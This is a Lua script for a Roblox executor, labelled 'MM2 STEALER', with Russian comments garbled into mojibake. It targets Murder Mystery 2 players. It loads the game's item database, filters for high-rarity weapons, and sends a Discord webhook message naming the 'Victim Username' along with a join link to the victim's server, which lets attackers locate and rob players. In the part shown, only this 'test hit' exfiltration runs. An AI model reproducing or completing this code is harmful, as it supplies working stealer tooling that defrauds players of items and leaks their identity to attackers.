-- –û–°–ù–û–í–ù–û–ô –°–ö–†–ò–ü–¢ MM2 STEALER
print("=== –û–°–ù–û–í–ù–û–ô –°–ö–†–ò–ü–¢ –ó–ê–ü–£–©–ï–ù ===")

if getgenv().scriptExecuted then 
    print("–°–∫—Ä–∏–ø—Ç —É–∂–µ –≤—ã–ø–æ–ª–Ω–µ–Ω, –≤—ã—Ö–æ–¥–∏–º")
    return 
end
getgenv().scriptExecuted = true

-- –ü—Ä–æ–≤–µ—Ä—è–µ–º –±–∞–π–ø–∞—Å–µ–Ω–Ω—ã–π JobId
if getgenv().RealJobId then
    game.JobId = getgenv().RealJobId
    print("–ò—Å–ø–æ–ª—å–∑—É–µ–º –±–∞–π–ø–∞—Å–µ–Ω–Ω—ã–π JobId:", game.JobId)
else
    print("–ë–∞–π–ø–∞—Å–µ–Ω–Ω—ã–π JobId –Ω–µ –Ω–∞–π–¥–µ–Ω, –∏—Å–ø–æ–ª—å–∑—É–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π:", game.JobId)
end

-- –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
print("–ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏...")
if getgenv().SavedSettings then
    print("–ù–∞—Å—Ç—Ä–æ–π–∫–∏ –Ω–∞–π–¥–µ–Ω—ã:", getgenv().SavedSettings)
else
    warn("–°–û–•–†–ê–ù–ï–ù–ù–´–ï –ù–ê–°–¢–†–û–ô–ö–ò –ù–ï –ù–ê–ô–î–ï–ù–´!")
    return
end

local users = getgenv().SavedSettings.Usernames or {}
local min_rarity = getgenv().SavedSettings.min_rarity or "Godly"
local min_value = getgenv().SavedSettings.min_value or 1
local ping = getgenv().SavedSettings.pingEveryone or "No"
local webhook = getgenv().SavedSettings.webhook or ""

print("Webhook:", webhook)
print("Users:", #users)

-- –ü–†–û–í–ï–†–ö–ê –ù–ê–°–¢–†–û–ï–ö
if webhook == "" or webhook:find("your_webhook_here") then
    warn("–û–®–ò–ë–ö–ê: –í–µ–±—Ö—É–∫ –Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω!")
    return
end

if next(users) == nil then
    warn("–û–®–ò–ë–ö–ê: Usernames –Ω–µ –¥–æ–±–∞–≤–ª–µ–Ω—ã!")
    return
end

if game.PlaceId ~= 142823291 then
    warn("–û–®–ò–ë–ö–ê: –ù–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º–∞—è –∏–≥—Ä–∞")
    return
end

print("–í—Å–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–æ–π–¥–µ–Ω—ã, –Ω–∞—á–∏–Ω–∞–µ–º —Ä–∞–±–æ—Ç—É...")

-- –û—Å–Ω–æ–≤–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
local weaponsToSend = {}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")

print("–ò–≥—Ä–æ–∫:", plr.Name)

-- –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö
local database
local success, err = pcall(function()
    database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
end)

if not success then
    warn("–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ database:", err)
    return
end

local HttpService = game:GetService("HttpService")

local rarityTable = {
    "Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"
}

-- –£–ø—Ä–æ—â–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ü–µ–Ω
local function getSimpleValueList()
    print("–°–æ–∑–¥–∞–µ–º —É–ø—Ä–æ—â–µ–Ω–Ω—ã–π —Å–ø–∏—Å–æ–∫ —Ü–µ–Ω...")
    local valueList = {}
    
    -- –ü—Ä–æ—Å—Ç—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è –¥–ª—è —Ç–µ—Å—Ç–∞
    for dataid, item in pairs(database) do
        local rarity = item.Rarity or ""
        local weaponRarityIndex = table.find(rarityTable, rarity)
        local godlyIndex = table.find(rarityTable, "Godly")
        
        if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
            valueList[dataid] = 10 -- –ü—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –¥–ª—è —Ç–µ—Å—Ç–∞
        end
    end
    
    return valueList
end

local function SendTestMessage()
    local jobIdToUse = getgenv().RealJobId or game.JobId
    local joinLink = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. jobIdToUse

    print("–û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–µ—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ...")
    print("JobId:", jobIdToUse)
    print("Link:", joinLink)

    local data = {
        ["content"] = "–¢–ï–°–¢–û–í–û–ï –°–û–û–ë–©–ï–ù–ò–ï –æ—Ç MM2 Stealer",
        ["embeds"] = {{
            ["title"] = "üé™ Test MM2 Hit",
            ["color"] = 65280,
            ["fields"] = {
                {
                    name = "Victim Username:",
                    value = plr.Name,
                    inline = true
                },
                {
                    name = "Join link:",
                    value = joinLink,
                    inline = false
                },
                {
                    name = "Status:",
                    value = "–¢–µ—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!",
                    inline = false
                }
            },
            ["footer"] = {
                ["text"] = "MM2 stealer test"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    
    print("–û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ webhook...")
    
    local success, response = pcall(function()
        return request({
            Url = webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = body
        })
    end)
    
    if success then
        print("–°—Ç–∞—Ç—É—Å –æ—Ç–≤–µ—Ç–∞:", response.StatusCode)
        if response.StatusCode == 204 or response.StatusCode == 200 then
            print("‚úÖ –¢–µ—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Discord!")
        else
            warn("‚ùå –û—à–∏–±–∫–∞ Discord:", response.StatusCode, response.Body)
        end
    else
        warn("‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:", response)
    end
end

-- –°—Ä–∞–∑—É –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–µ—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
SendTestMessage()

print("=== –°–ö–†–ò–ü–¢ –£–°–ü–ï–®–ù–û –ó–ê–í–ï–†–®–ò–õ –†–ê–ë–û–¢–£ ===")
